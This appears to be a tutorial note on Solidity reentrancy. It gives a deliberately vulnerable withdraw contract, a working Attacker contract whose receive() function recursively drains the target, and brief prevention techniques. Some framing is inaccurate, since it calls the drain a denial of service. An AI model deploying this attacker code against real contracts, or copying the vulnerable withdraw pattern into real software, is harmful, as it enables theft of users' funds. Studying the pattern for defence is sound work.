
***** If a contract processes external calls before updating its state,
attackers can repeatedly call a function to block execution.*******



----------------
contract A{

function x(){
//code                                                ---------------------------------------------------
.External Call ====================================> contract Attacker{ Takes the control of Contract A 
                                                    and executes before the state updation of cotractct A
                                                    and drain all the funds }                                                 
.Internal  state  Updation                           ----------------------------------------------------                
                                     
}


}


-----------------





pragma solidity ^0.8.0;

contract ReentrancyDoS {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balances[msg.sender] > 0, "No balance");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;//this executes after the completion of the call() method
        //to the external contract 
    }
}


//interfact to the above contract

interface ReentrancyDoS {
    function deposit() external payable;
    function withdraw() external;
    function balances(address) external view returns (uint256);
}



//attacker contract call method recursively
contract Attacker {
    ReentrancyDoS public target;
    uint256 public attackBalance;

    constructor(address _target) {
        target = ReentrancyDoS(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Must send some ether");
        target.deposit{value: msg.value}();
        attackBalance = msg.value;
        target.withdraw();
    }

    function withdraw() external {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }

    receive() external payable {
        if (address(target).balance > 0) {//Drain funds recursively until the funds becomes zero
            target.withdraw();
        }
    }

    function getTargetBalance() public view returns (uint256){
        return address(target).balance;
    }
    function getAttackerBalance() public view returns (uint256){
        return address(this).balance;
    }

}

****Preventing techniques ***

1.Checks-Effects-Interactions Pattern: 

Perform all checks and state changes before making external calls.

2.Reentrancy Guards:
Use a mutex (a lock) to prevent re-entrant calls. OpenZeppelin's ReentrancyGuard library is a common solution.

3.Send vs. Transfer vs. Call:
Use send() or transfer() with caution, as they limit gas. Consider using call() with a gas limit and checking the return value.